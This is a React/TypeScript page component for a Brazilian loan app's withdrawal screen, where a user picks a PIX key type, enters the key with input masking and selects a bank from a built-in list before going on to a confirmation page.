import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { ArrowLeft, ArrowDownToLine, House, User, Zap, Landmark } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

const maskPhone = (v: string) => {
  const d = v.replace(/\D/g, "").slice(0, 11);
  if (d.length <= 2) return d.length ? `(${d}` : "";
  if (d.length <= 6) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
  if (d.length <= 10) return `(${d.slice(0, 2)}) ${d.slice(2, 6)}-${d.slice(6)}`;
  return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
};

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const maskCPF = (v: string) =>
  v
    .replace(/\D/g, "")
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");

const BANCOS: { codigo: string; nome: string }[] = [
  { codigo: "001", nome: "Banco do Brasil" },
  { codigo: "027", nome: "Banco do Estado de Santa Catarina (BESC)" },
  { codigo: "029", nome: "Banco Itaú Consignado" },
  { codigo: "033", nome: "Santander" },
  { codigo: "036", nome: "Banco Bradesco BBI" },
  { codigo: "037", nome: "Banco do Estado do Pará (Banpará)" },
  { codigo: "041", nome: "Banrisul" },
  { codigo: "047", nome: "Banco do Estado de Sergipe (Banese)" },
  { codigo: "070", nome: "BRB - Banco de Brasília" },
  { codigo: "077", nome: "Banco Inter" },
  { codigo: "082", nome: "Banco Topázio" },
  { codigo: "084", nome: "Uniprime Norte do Paraná" },
  { codigo: "085", nome: "Cooperativa Central Ailos" },
  { codigo: "089", nome: "Cooperativa de Crédito Rural da Região da Mogiana" },
  { codigo: "097", nome: "Credisis" },
  { codigo: "099", nome: "Uniprime Central" },
  { codigo: "104", nome: "Caixa Econômica Federal" },
  { codigo: "121", nome: "Banco Agibank" },
  { codigo: "133", nome: "Cresol" },
  { codigo: "136", nome: "Unicred" },
  { codigo: "151", nome: "Banco Nossa Caixa" },
  { codigo: "184", nome: "Banco Itaú BBA" },
  { codigo: "208", nome: "Banco BTG Pactual" },
  { codigo: "212", nome: "Banco Original" },
  { codigo: "213", nome: "Banco Arbi" },
  { codigo: "218", nome: "Banco BS2" },
  { codigo: "222", nome: "Banco Credit Agricole Brasil" },
  { codigo: "224", nome: "Banco Fibra" },
  { codigo: "237", nome: "Bradesco" },
  { codigo: "241", nome: "Banco Clássico" },
  { codigo: "243", nome: "Banco Master" },
  { codigo: "246", nome: "Banco ABC Brasil" },
  { codigo: "260", nome: "Nu Pagamentos (Nubank)" },
  { codigo: "265", nome: "Banco Fator" },
  { codigo: "266", nome: "Banco Cédula" },
  { codigo: "290", nome: "PagSeguro (PagBank)" },
  { codigo: "323", nome: "Mercado Pago" },
  { codigo: "335", nome: "Banco Digio" },
  { codigo: "336", nome: "Banco C6" },
  { codigo: "341", nome: "Itaú Unibanco" },
  { codigo: "348", nome: "Banco XP" },
  { codigo: "364", nome: "Gerencianet Pagamentos (Efí)" },
  { codigo: "376", nome: "Banco J.P. Morgan" },
  { codigo: "380", nome: "PicPay" },
  { codigo: "389", nome: "Banco Mercantil do Brasil" },
  { codigo: "422", nome: "Banco Safra" },
  { codigo: "623", nome: "Banco Pan" },
  { codigo: "655", nome: "Banco Votorantim" },
  { codigo: "735", nome: "Banco Neon" },
  { codigo: "739", nome: "Banco Cetelem" },
  { codigo: "741", nome: "Banco Ribeirão Preto" },
  { codigo: "743", nome: "Banco Semear" },
  { codigo: "745", nome: "Citibank" },
  { codigo: "748", nome: "Sicredi" },
  { codigo: "756", nome: "Sicoob" },
  { codigo: "260", nome: "Next" },
];

const Saque = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();
  const valor = Number(params.get("valor") || 5000);

  const [tipoChave, setTipoChave] = useState("CPF");
  const [chave, setChave] = useState("");
  const [banco, setBanco] = useState("");
  const [showBancos, setShowBancos] = useState(false);

  const labelChave = tipoChave === "CPF" ? "Digite seu CPF" : tipoChave === "Telefone" ? "Digite seu telefone" : tipoChave === "E-mail" ? "Digite seu e-mail" : "Digite sua chave aleatória";
  const placeholderChave = tipoChave === "CPF" ? "000.000.000-00" : tipoChave === "Telefone" ? "(00) 00000-0000" : tipoChave === "E-mail" ? "voce@email.com" : "Chave aleatória";

  const filtrados = BANCOS.filter((b) => {
    const q = banco.toLowerCase();
    return b.nome.toLowerCase().includes(q) || b.codigo.includes(q);
  });
  const valid = chave.length >= 4 && banco.length >= 2;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!valid) return;
    const sp = new URLSearchParams(params);
    sp.set("chave", chave);
    sp.set("tipoChave", tipoChave);
    sp.set("banco", banco);
    navigate(`/saque/confirmar?${sp.toString()}`);
  };

  return (
    <div style={{ minHeight: "100vh", background: "#F4F4F7", paddingBottom: 110, fontFamily: fontStack }}>
      <header style={{ background: "#1C68E3", color: "#fff", padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <button
          onClick={() => navigate(-1)}
          style={{ background: "transparent", border: "none", color: "#fff", display: "inline-flex", alignItems: "center", gap: 4, fontSize: 14, fontWeight: 500, cursor: "pointer", fontFamily: fontStack }}
        >
          <ArrowLeft size={18} /> Voltar
        </button>
        <span style={{ fontSize: 18, fontWeight: 800, letterSpacing: -0.4 }}>Bancred</span>
        <div style={{ width: 60 }} />
      </header>

      <main style={{ padding: 14, maxWidth: 480, margin: "0 auto" }}>
        <div style={{ background: "#fff", borderRadius: 16, padding: 18, border: "1px solid #E5E7EB", textAlign: "center", marginBottom: 14, boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)" }}>
          <div style={{ fontSize: 13, color: "#6B7280", marginBottom: 6 }}>Você está sacando</div>
          <div style={{ fontSize: 28, fontWeight: 800, color: "#1C68E3", marginBottom: 6 }}>{formatBRL(valor)}</div>
          <div style={{ fontSize: 12, color: "#16A34A" }}>✓ Valor total do empréstimo aprovado</div>
        </div>

        <div style={{ background: "#fff", borderRadius: 16, padding: 18, border: "1px solid #E5E7EB", boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)" }}>
          <form onSubmit={handleSubmit}>
            <h2 style={{ fontSize: 15, fontWeight: 700, color: "#111827", marginBottom: 12 }}>Tipo de chave PIX</h2>
            <div style={{ display: "flex", flexDirection: "column", gap: 10, marginBottom: 18 }}>
              {["CPF", "Telefone", "E-mail", "Chave aleatória"].map((t) => {
                const checked = tipoChave === t;
                return (
                  <label key={t} style={{ display: "flex", alignItems: "center", gap: 10, cursor: "pointer", fontSize: 14, color: "#111827" }}>
                    <span style={{ width: 18, height: 18, borderRadius: "50%", border: `2px solid ${checked ? "#1C68E3" : "#D1D5DB"}`, display: "inline-flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                      {checked && <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#1C68E3" }} />}
                    </span>
                    <input type="radio" style={{ display: "none" }} name="tipoChave" checked={checked} onChange={() => { setTipoChave(t); setChave(""); }} />
                    {t}
                  </label>
                );
              })}
            </div>

            <label style={{ display: "block", fontSize: 13, fontWeight: 600, color: "#111827", marginBottom: 6 }}>{labelChave}</label>
            <input
              type={tipoChave === "E-mail" ? "email" : "text"}
              inputMode={tipoChave === "CPF" || tipoChave === "Telefone" ? "numeric" : "text"}
              placeholder={placeholderChave}
              value={chave}
              onChange={(e) => {
                const raw = e.target.value;
                if (tipoChave === "CPF") setChave(maskCPF(raw));
                else if (tipoChave === "Telefone") setChave(maskPhone(raw));
                else setChave(raw);
              }}
              style={{ width: "100%", padding: "14px 16px", border: "1.5px solid #E5E7EB", borderRadius: 12, fontSize: 16, outline: "none", boxSizing: "border-box", background: "#fff", color: "#111827", fontFamily: fontStack, minHeight: 50, marginBottom: 14 }}
            />

            <label style={{ display: "block", fontSize: 13, fontWeight: 600, color: "#111827", marginBottom: 6 }}>
              <Landmark size={14} style={{ display: "inline", marginRight: 6, verticalAlign: -2 }} />
              Qual é o seu banco?
            </label>
            <div style={{ position: "relative" }}>
              <input
                type="text"
                placeholder="Digite ou selecione seu banco"
                value={banco}
                onChange={(e) => { setBanco(e.target.value); setShowBancos(true); }}
                onFocus={() => setShowBancos(true)}
                onBlur={() => setTimeout(() => setShowBancos(false), 150)}
                autoComplete="off"
                style={{ width: "100%", padding: "14px 16px", border: "1.5px solid #E5E7EB", borderRadius: 12, fontSize: 16, outline: "none", boxSizing: "border-box", background: "#fff", color: "#111827", fontFamily: fontStack, minHeight: 50 }}
              />
              {showBancos && filtrados.length > 0 && (
                <div style={{ position: "absolute", top: "calc(100% + 4px)", left: 0, right: 0, background: "#fff", border: "1px solid #E5E7EB", borderRadius: 10, maxHeight: 200, overflowY: "auto", zIndex: 10, boxShadow: "0 8px 24px rgba(0,0,0,0.08)" }}>
                  {filtrados.map((b) => (
                    <div
                      key={`${b.codigo}-${b.nome}`}
                      onMouseDown={() => { setBanco(b.nome); setShowBancos(false); }}
                      style={{ padding: "10px 14px", fontSize: 14, color: "#111827", cursor: "pointer", borderBottom: "1px solid #F3F4F6", display: "flex", alignItems: "center", gap: 14 }}
                    >
                      <span style={{ color: "#6B7280", fontVariantNumeric: "tabular-nums", minWidth: 36, fontSize: 13 }}>{b.codigo}</span>
                      <span>{b.nome}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div style={{ marginTop: 18 }}>
              <button
                type="submit"
                disabled={!valid}
                style={{ width: "100%", padding: "15px 20px", background: valid ? "#1C68E3" : "#93C5FD", color: "#fff", border: "none", borderRadius: 14, fontSize: 16, fontWeight: 700, cursor: valid ? "pointer" : "not-allowed", boxShadow: valid ? "0 8px 24px rgba(28,104,227,0.28)" : "none", display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 8, fontFamily: fontStack, minHeight: 52 }}
              >
                <Zap size={16} /> Sacar {formatBRL(valor)}
              </button>
            </div>
          </form>
        </div>
      </main>

      <nav style={{ position: "fixed", bottom: 0, left: 0, right: 0, background: "#fff", borderTop: "1px solid #E5E7EB", display: "grid", gridTemplateColumns: "repeat(3, 1fr)", padding: "8px 0 calc(8px + env(safe-area-inset-bottom))", zIndex: 50 }}>
        {[
          { Icon: House, label: "Home", active: false, to: `/dashboard?${params.toString()}` },
          { Icon: ArrowDownToLine, label: "Saque", active: true, to: `/saque?${params.toString()}` },
          { Icon: User, label: "Meus Dados", active: false, to: `/dashboard?${params.toString()}` },
        ].map(({ Icon, label, active, to }) => (
          <button
            key={label}
            type="button"
            onClick={() => navigate(to)}
            style={{ background: "transparent", border: "none", display: "flex", flexDirection: "column", alignItems: "center", gap: 2, color: active ? "#1C68E3" : "#6B7280", cursor: "pointer", padding: 4, fontSize: 11, fontWeight: active ? 600 : 500, fontFamily: fontStack }}
          >
            <Icon size={20} />
            {label}
          </button>
        ))}
      </nav>
    </div>
  );
};

export default Saque;
